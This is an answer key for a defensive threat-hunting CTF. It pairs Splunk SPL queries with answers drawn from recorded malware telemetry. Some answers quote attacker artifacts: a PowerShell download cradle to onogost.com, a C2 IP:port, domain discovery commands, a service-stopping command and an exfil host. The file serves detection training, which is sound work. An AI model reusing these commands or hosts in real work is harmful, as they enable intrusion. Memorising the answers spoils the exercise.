# Attack Data micro-CTF — Solutions

Every answer below was confirmed by running the SPL against the actual
ingested `attack_data` index in this lab, not derived from attack_data's
own metadata (which only labels the *technique*, not specific field
values) — see `challenges/attack-data-ctf/README.md` for how this pack
was built.

### AD01 — acidrain

```spl
index=attack_data host=acidrain EventCode=1
| stats count by ParentImage
| sort -count
```

`/usr/bin/dpkg` (730) is by far the most common parent — this whole
sample is dpkg/apt package-management chatter, not AcidRain's actual
device-wipe behavior (AcidRain wipes MTD/block devices directly via
ioctl calls, which Sysmon's process/file events don't surface).

**Answer: /usr/bin/dpkg** (noise, not the attack)

### AD02 — agent_tesla

```spl
index=attack_data host=agent_tesla EventCode=4104
| table _time ScriptBlockText
```

One script block runs `(New-Object Net.WebClient)...DownloadString('https://onogost.com/micro.txt')`.

**Answer: onogost.com** (full URL: `https://onogost.com/micro.txt`)

### AD03 — amadey

```spl
index=attack_data host=amadey EventCode=13 TargetObject="*Startup*"
| table _time Image TargetObject Details
```

Repeated registry `SetValue` events on
`...\Explorer\User Shell Folders\Startup` all come from the same `Image`.

**Answer: C:\Users\Administrator\a9e2a16078\metado.exe**

*Further reading: [Malpedia: win.amadey](https://malpedia.caad.fkie.fraunhofer.de/details/win.amadey)*

### AD04 — awfulshred

```spl
index=attack_data host=awfulshred EventCode=1 Image="*/ps"
| table _time CommandLine
```

**Answer: ps -e -o pid,ppid,state,command**

### AD05 — azorult

```spl
index=attack_data host=azorult EventCode=3 Image="*rutserv.exe"
| table _time DestinationIp DestinationPort
```

**Answer: 95.213.205.83:5655**

### AD06 — brute_ratel

```spl
index=attack_data host=brute_ratel EventCode=4688
| stats count by ParentProcessName
```

Most of the sample is Splunk-forwarder noise, but one parent stands out:
`C:\Temp\poc_2\c2_agent.exe` — the actual Brute Ratel agent binary.

```spl
index=attack_data host=brute_ratel EventCode=4688 ParentProcessName="*c2_agent*"
| table _time NewProcessName CommandLine
```

It launches Calculator — a classic, harmless proof-of-execution payload
used to demo C2 code-execution capability.

**Answer: calc.exe** (full path `C:\Windows\System32\calc.exe`, launched by `C:\Temp\poc_2\c2_agent.exe`)

*Further reading: [Unit 42: Brute Ratel C4 Tool](https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/)*

### AD07 — chaos_ransomware

```spl
index=attack_data host=chaos_ransomware EventCode=1 ParentImage="*explorer.exe"
| table _time Image CommandLine
```

**Answer: C:\Temp\Downloads\svchosts.exe**

### AD08 — clop

```spl
index=attack_data host=clop EventCode=7045
| table _time ServiceName ImagePath
```

Two services get registered; the one pointing at the attacker's
temp-folder binary is the answer (the other, `SecurityCenterIBM`, points
at bare `cmd.exe`).

**Answer: WinCheckDRVs** (ImagePath: `C:\Temp\mockService.exe`)

### AD09 — conti

```spl
index=attack_data host=conti EventCode=4688 CommandLine="*7z*"
| table _time CommandLine
```

**Answer: `7z.exe a -tzip test.zip \\127.0.0.1\C$\Users\Public\Documents\*`**

### AD10 — cyclopsblink

```spl
index=attack_data host=cyclopsblink EventCode=3
| stats count by DestinationIp DestinationPort
| sort -count
```

Alongside constant SSH (`10.0.1.20:22`) and Splunk-forwarder
(`10.0.1.12:8000`) traffic, `amazon-ssm-agent` reaches the AWS instance
metadata service.

**Answer: 169.254.169.254:80**

### AD11 — dcrat

```spl
index=attack_data host=dcrat EventCode=4104
| table _time ScriptBlockText
```

**Answer: Win32_PnPEntity**

### AD12 — doublezero_wiper

```spl
index=attack_data host=doublezero_wiper EventCode=11 TargetFilename="*.exe"
| table _time TargetFilename
```

**Answer: C:\Users\Administrator\Desktop\doublezero.exe**

### AD13 — fin7

```spl
index=attack_data host=fin7 EventCode=7 Image="*wscript.exe"
| table _time ImageLoaded Description
```

`wscript.exe` (a script host) has no legitimate reason to load an LDAP
provider DLL.

**Answer: adsldpc.dll** (`C:\Windows\System32\adsldpc.dll`)

### AD14 — gootloader

```spl
index=attack_data host=gootloader EventCode=11 TargetFilename="*.JS"
| table _time TargetFilename
```

**Answer: C:\Users\VICTIM\AppData\Roaming\com.adobe.dunamis\PROOFORMACE NEGOTIATION.JS**

### AD15 — hermetic_wiper

```spl
index=attack_data host=hermetic_wiper EventCode=23
| table _time TargetFilename Image
```

Every delete in this sample is the Splunk forwarder rotating its own
WinEventLog modinput checkpoint files — not HermeticWiper's actual
disk-wipe activity, which isn't captured at the file-event level Sysmon
reports at.

**Answer: C:\Program Files\SplunkUniversalForwarder\var\lib\splunk\modinputs\WinEventLog\** (noise, not the attack)

### AD16 — icedid

```spl
index=attack_data host=icedid EventCode=1 ParentImage="*cmd.exe"
| table _time Image CommandLine
```

Behind the Splunk-forwarder noise, `cmd.exe` runs a discovery chain:
`ping`, `nltest /domain_trusts`, `nltest /dclist:`, `netstat -a -n -p
tcp`, `net group "domain Admins" /DOMAIN`, `net group "Domain
Computers" /DOMAIN`, `ipconfig /all`.

**Answer: /domain_trusts** (`nltest /domain_trusts`)

### AD17 — industroyer2

```spl
index=attack_data host=industroyer2 EventCode=1 Image="*industroyer2.exe"
| table _time CommandLine
```

**Answer: `industroyer2.exe  -t 21`** (path: `C:\OIK\Temporary0\industroyer2.exe`)

### AD18 — lockbit_ransomware

```spl
index=attack_data host=lockbit_ransomware EventCode=11 TargetFilename="*README*"
| table _time TargetFilename Image
```

**Answer: cHpfiXA9s.README.txt**, created by **C:\Temp\ConfirmEmail.exe**

### AD19 — notdoor

```spl
index=attack_data host=notdoor EventCode=11
| table _time TargetFilename Image
```

**Answer: C:\Users\localuser\AppData\Roaming\Microsoft\Outlook\VbaProject.OTM**

### AD20 — olympic_destroyer

```spl
index=attack_data host=olympic_destroyer EventCode=7040
| rex field=_raw "Message=The start type of the (?<SvcName>.+) service was changed"
| stats dc(SvcName) AS distinct_services count AS total_events
```

456 EventCode=7040 events, 454 distinct service names — this isn't
targeted sabotage of one service, it's OlympicDestroyer living up to its
name: systematically disabling essentially *every* service on the host
(drivers, network stack, WMI, Windows Update, Remote Desktop, even
`SysmonDrv` and the Splunk forwarder's own services) so the machine
can't function or be remotely managed after reboot.

**Answer: ~454 distinct services** (out of 456 total disable events)

### AD21 — prestige_ransomware

```spl
index=attack_data host=prestige_ransomware EventCode=11 TargetFilename="*README"
| table _time TargetFilename Image
```

**Answer: C:\Users\Public\README and C:\README**, both created by **C:\Temp\prestige_ransomware.exe**

### AD22 — qakbot

```spl
index=attack_data host=qakbot EventCode=8
| stats count by TargetImage
| sort -count
```

**Answer: C:\Program Files\Mozilla Firefox\firefox.exe**

### AD23 — ransomware_ttp

```spl
index=attack_data host=ransomware_ttp
| stats count by EventCode
```

4105 = script block start, 4104 = the block's text, 4106 = script block
stop.

**Answer: 4105**

### AD24 — redline

```spl
index=attack_data host=redline EventCode=11 Image="*notepad++.exe"
| table _time TargetFilename
```

**Answer: C:\Temp\simulate_dummy_reg.bat**

### AD25 — remcos

```spl
index=attack_data host=remcos EventCode=7 ImageLoaded="*dynwrapx*"
| table _time Image ImageLoaded Description
```

**Answer: dynwrapx.dll** (DynamicWrapperX)

### AD26 — revil

```spl
index=attack_data host=revil
| stats count by EventCode
```

Same PowerShell Script Block Logging triplet as AD23: 4105 start, 4104
text, 4106 stop.

**Answer: 4106**

### AD27 — ryuk

```spl
index=attack_data host=ryuk EventCode=1 CommandLine="*net*stop*"
| table _time CommandLine
```

**Answer: samss** (Security Accounts Manager — `net stop "samss" /y`)

### AD28 — snakemalware

```spl
index=attack_data host=snakemalware EventCode=13 TargetObject="*OpenWithProgIds*"
| table _time TargetObject
```

**Answer: .wav** (`HKCR\.wav\OpenWithProgIds\AtomicSnake`)

### AD29 — swift_slicer

```spl
index=attack_data host=swift_slicer EventCode=23
| eval is_firefox=if(match(TargetFilename, "Firefox"), 1, 0)
| stats count by is_firefox
```

25,812 of 48,759 deletes (~53%) are inside a Firefox profile's
`cache2\entries\` — the single largest category, though not "nearly
every" (the rest is mostly more Splunk-forwarder checkpoint noise).

**Answer: Mozilla Firefox** (browser cache, `AppData\Local\Mozilla\Firefox\Profiles\...\cache2\entries\`)

### AD30 — trickbot

```spl
index=attack_data host=trickbot EventCode=5145
| table _time RelativeTargetName ShareName
```

**Answer: test.exe and exploit.exe** (both accessed over the `C$` share)

### AD31 — vilsel

```spl
index=attack_data host=vilsel EventCode=1 Image="*ROUTE.EXE"
| table _time CommandLine
```

**Answer: route**

### AD32 — warzone_rat

```spl
index=attack_data host=warzone_rat EventCode=7 Image="*Dism.exe"
| table _time ImageLoaded
```

**Answer: dismcore.dll**

*Further reading: [Malpedia: win.ave_maria](https://malpedia.caad.fkie.fraunhofer.de/details/win.ave_maria) (Warzone RAT is also tracked as "Ave Maria")*

### AD33 — winpeas

```spl
index=attack_data host=winpeas EventCode=4104
| table _time ScriptBlockText
```

**Answer: Get-Clipboard**

### AD34 — winter-vivern

```spl
index=attack_data host="winter-vivern" EventCode=4104
| table _time ScriptBlockText
```

The reassembled script sets `$singleHost = 'https://wintervivern.com/'`
and uses it to build both the payload-fetch and exfil URLs.

**Answer: wintervivern.com**
